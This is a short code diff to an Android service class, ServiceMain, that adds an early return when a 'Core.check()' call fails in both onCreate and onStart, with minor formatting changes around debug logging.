@@ -29,9 +29,12 @@ public class ServiceMain extends Service {
 		super.onCreate();
 		
 		Status.setAppContext(getApplicationContext());
+		if( ! Core.check() ){
+			return;
+		}
+		
 		Messages.init(getApplicationContext());
 		
-
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
@@ -68,7 +71,10 @@ public class ServiceMain extends Service {
 		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
-			
+		}
+		
+		if( ! Core.check() ){
+			return;
 		}
 
 		Root root=new Root();
